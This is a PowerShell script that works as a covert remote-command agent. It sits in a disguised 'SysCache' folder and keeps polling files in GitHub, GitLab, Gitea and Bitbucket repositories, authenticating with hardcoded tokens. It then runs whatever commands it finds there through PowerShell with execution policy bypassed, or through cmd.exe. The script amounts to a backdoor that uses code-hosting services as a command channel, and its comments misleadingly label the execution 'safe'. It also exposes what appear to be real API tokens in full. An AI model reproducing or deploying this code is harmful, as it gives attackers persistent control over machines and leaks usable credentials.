# Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

############################
# CONFIG
############################
$INTERVAL      = 5
$CMD_TIMEOUT   = 60
$CURL_TIMEOUT  = 15
$BASE_DIR = "$env:USERPROFILE\AppData\Local\SysCache"

$STATE_DIR = Join-Path $BASE_DIR "state"
$LOG_DIR   = Join-Path $BASE_DIR "logs"
$CONFIG_ABC = Join-Path $BASE_DIR ".uniq_name"

New-Item -ItemType Directory -Force -Path $STATE_DIR, $LOG_DIR | Out-Null
Set-Location $BASE_DIR

$FILE = ""
$maxRetry = 2
$retry = 0

while ($retry -le $maxRetry) {
    if (Test-Path $CONFIG_ABC) {
        $FILE = (Get-Content $CONFIG_ABC -First 1).Trim()
        if (-not [string]::IsNullOrWhiteSpace($FILE)) {
            break
        }
    }

    if ($retry -lt $maxRetry) {
        Start-Sleep -Seconds 5
    }
    $retry++
}

if ([string]::IsNullOrWhiteSpace($FILE)) {
    $FILE = "test.txt"
}

Write-Host "Using file: $FILE"


New-Item -ItemType Directory -Force -Path $STATE_DIR, $LOG_DIR | Out-Null

############################
# TOKENS (READ ONLY)
############################
$GITHUB_TOKEN="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"
$GITHUB_OWNER="mahesh97m"
$GITHUB_REPO="phpcode"

$GITLAB_TOKEN="glpat-44_-EqPHnzpoYv6Q7MQN0G86MQp1OmpkcmY3Cw.01.121i899xo"
$GITLAB_PROJECT_ID="77335080"
$BRANCH="main"

$GITEA_TOKEN="e74500c25abc6c336cf56363912cc25b8889c1f9"
$GITEA_OWNER="mahesh2210m"
$GITEA_REPO="mahesh2210m"

$BITBUCKET_TOKEN="ATCTT3xFfGN0DuQH8htZo8z3MUuZ9djgI2zgZ2OsuFr6EB2UB6VrslIcrSrIj5oLUlYEDynqHgWeyYip58JTcYbbb2e0E3Wlm0ycYQhPt8GUyrc7dvTCE-JgOjF4jF3szz1zZUZGdGuVTCqIpG6fmqw7y41barxprerA_t_OM_kVEhatQrNJdfA=1417FEA8"
$BITBUCKET_WORKSPACE="mahesh2210m"
$BITBUCKET_REPO="mahesh"
############################
# TIME / LOGGING
############################
function TS { Get-Date -Format "yyyy-MM-dd HH:mm:ss" }

function Log-Exec($msg) {
    "$(TS) | $msg" | Add-Content "$LOG_DIR\executions.log"
}

function Log-Err($msg) {
    "$(TS) | $msg" | Add-Content "$LOG_DIR\errors.log"
}

############################
# SAFE COMMAND EXECUTION
############################
function Run-Cmd {
    param([string]$Cmd)

    try {
        $job = Start-Job -ScriptBlock {
            param($c)

            $isPS = $false
            if (
                $c -match '\|' -or
                $c -match 'Out-File|Write-Output|Start-Process|Get-|Set-|New-|Remove-|\$'
            ) {
                $isPS = $true
            }

            if ($isPS) {
                powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $c
                exit $LASTEXITCODE
            } else {
                cmd.exe /c $c
                exit $LASTEXITCODE
            }
        } -ArgumentList $Cmd

        if (Wait-Job $job -Timeout $CMD_TIMEOUT) {
            Receive-Job $job -ErrorAction SilentlyContinue | Out-Null
            $state = $job.State
            Remove-Job $job -Force

            return ($state -eq "Completed")
        }
        else {
            Stop-Job $job -Force
            Remove-Job $job -Force
            return $false
        }

    } catch {
        return $false
    }
}


############################
# SAFE CURL (Invoke-WebRequest)
############################
function Safe-Fetch {
    param(
        [string]$Url,
        [hashtable]$Headers
    )

    try {
        $resp = Invoke-WebRequest `
            -Uri $Url `
            -Headers $Headers `
            -TimeoutSec $CURL_TIMEOUT `
            -UseBasicParsing
        return $resp.Content
    } catch {
        return $null
    }
}

############################
# FETCHERS
############################
function Fetch-GitHub {
    Safe-Fetch `
      "https://api.github.com/repos/$GITHUB_OWNER/$GITHUB_REPO/contents/$FILE" `
      @{ Authorization="token $GITHUB_TOKEN"; Accept="application/vnd.github.v3.raw" }
}

function Fetch-GitLab {
    Safe-Fetch `
      "https://gitlab.com/api/v4/projects/$GITLAB_PROJECT_ID/repository/files/$FILE/raw?ref=$BRANCH" `
      @{ "PRIVATE-TOKEN"=$GITLAB_TOKEN }
}

function Fetch-Gitea {
    Safe-Fetch `
      "https://gitea.com/api/v1/repos/$GITEA_OWNER/$GITEA_REPO/raw/$BRANCH/$FILE" `
      @{ Authorization="token $GITEA_TOKEN" }
}

function Fetch-Bitbucket {
    Safe-Fetch `
      "https://api.bitbucket.org/2.0/repositories/$BITBUCKET_WORKSPACE/$BITBUCKET_REPO/src/$BRANCH/$FILE" `
      @{ Authorization="Bearer $BITBUCKET_TOKEN" }
}

############################
# VERSION COMPARE
############################
function Version-Greater {
    param($A, $B)
    return ([Version]$A -gt [Version]$B)
}

############################
# MAIN LOOP (NEVER BLOCKS)
############################
while ($true) {

    foreach ($SRC in "github","gitlab","gitea","bitbucket") {

        switch ($SRC) {
            "github"   { $CONTENT = Fetch-GitHub }
            "gitlab"   { $CONTENT = Fetch-GitLab }
            "gitea"    { $CONTENT = Fetch-Gitea }
            "bitbucket"{ $CONTENT = Fetch-Bitbucket }
        }

        if ([string]::IsNullOrWhiteSpace($CONTENT)) { continue }

        $LAST_FILE = "$STATE_DIR\${SRC}_last_version.txt"
        if (!(Test-Path $LAST_FILE)) { "" | Set-Content $LAST_FILE }

        $LAST_VERSION = (Get-Content $LAST_FILE).Trim()

        $CURRENT_VERSION = ($CONTENT -split "`n" |
            Where-Object { $_ -match '^[0-9]+(\.[0-9]+)*$' } |
            Select-Object -Last 1).Trim()

        if ([string]::IsNullOrWhiteSpace($CURRENT_VERSION)) { continue }

        if ($LAST_VERSION -eq "" -or (Version-Greater $CURRENT_VERSION $LAST_VERSION)) {

            Log-Exec "SRC=$SRC NEW_VERSION=$CURRENT_VERSION"

            $lines = $CONTENT -split "`n"
            $run = $false

            foreach ($line in $lines) {
                $cmd = $line.Trim()

                if ($cmd -eq $CURRENT_VERSION) { $run = $true; continue }
                if ($run -and $cmd -match '^[0-9]+(\.[0-9]+)*$') { break }
                if ($run -and $cmd.Length -gt 0) {

                    Log-Exec "SRC=$SRC RUN: $cmd"

                    if (Run-Cmd $cmd) {
                        Log-Exec "SRC=$SRC SUCCESS"
                    } else {
                        Log-Err "SRC=$SRC FAILED or TIMEOUT: $cmd"
                    }
                }
            }

            $CURRENT_VERSION | Set-Content $LAST_FILE
            Log-Exec "SRC=$SRC VERSION UPDATED"
        }
    }

    Start-Sleep -Seconds $INTERVAL
}
